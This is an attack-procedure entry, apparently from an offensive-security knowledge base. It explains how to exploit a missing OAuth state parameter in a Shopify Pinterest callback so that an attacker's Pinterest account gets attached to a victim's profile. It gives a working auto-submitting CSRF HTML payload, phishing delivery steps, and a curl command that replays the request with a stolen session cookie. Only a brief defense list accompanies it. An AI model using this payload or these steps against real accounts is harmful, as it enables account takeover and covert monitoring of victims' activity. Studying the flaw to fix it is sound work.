---
id: proc-forge-csrf-pinterest-attach
tags:
  - csrf
  - oauth
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:35.268Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Forge-CSRF-Request-to-Attach-Pinterest-Account

## Summary

This procedure exploits the CSRF vulnerability in Shopify's Pinterest OAuth callback by forging a request to attach the attacker's Pinterest account to the victim's Shopify profile, enabling unauthorized monitoring of activities.

## Description

The attack leverages the missing state parameter in the /auth/pinterest/callback endpoint. An attacker initiates OAuth from their Pinterest account to obtain a valid code, then crafts a malicious page or link that submits this code via the victim's Shopify session. When the victim visits the page (e.g., via phishing), the request attaches the attacker's account without consent. This occurs in web environments with OAuth integrations, leading to persistence and data exfiltration via linked activities.

## Requirements

1. Attacker's Pinterest account and Shopify access for testing
2. Victim's Shopify session cookie (obtained via XSS, phishing, etc.)
3. Valid OAuth code from attacker's Pinterest authorization
4. Hosting for malicious HTML page

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies and state validation in OAuth
- Require user confirmation for account attachments
- Log and alert on OAuth callbacks from unexpected referers
- Implement Content Security Policy to block forged submissions

## Objectives

1. Attach attacker's Pinterest account to victim's profile
2. Gain access to monitor synced activities
3. Demonstrate impact of unmitigated CSRF in OAuth

## Instructions

### Step 1: Obtain Valid OAuth Code

**Context**: As the attacker, start a legitimate OAuth flow from your Pinterest account to get a usable code for the callback.

Log in to your Pinterest, initiate the Shopify integration, and capture the code parameter from the redirect URI using browser dev tools.

**Expected Output**: A short-lived code value, e.g., code=abc123.

### Step 2: Craft Malicious CSRF Payload

**Context**: Create an HTML page that auto-submits the callback request using the victim's session.

Build a simple form:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://pinterest-commerce.shopifyapps.com/auth/pinterest/callback?code=YOUR_CODE" method="GET" style="display:none;">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Host this on a server and send to victim via phishing, ensuring the victim's Shopify cookie is included if using an iframe or extension.

**Expected Output**: Upon load, the form submits, forging the attachment.

### Step 3: Execute and Verify

**Context**: Deliver the payload and confirm attachment.

Send the link to the victim. After execution, check the victim's Shopify profile for the attached Pinterest account (yours).

Test with curl using stolen cookie:

```bash
curl -X GET "https://pinterest-commerce.shopifyapps.com/auth/pinterest/callback?code=YOUR_CODE" -H "Cookie: shopify_session=VICTIM_COOKIE" -v
```

> The -v flag shows verbose output; look for 200 OK or redirect indicating success.

**Expected Output**: Attachment succeeds, allowing activity monitoring.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[account-takeover]]
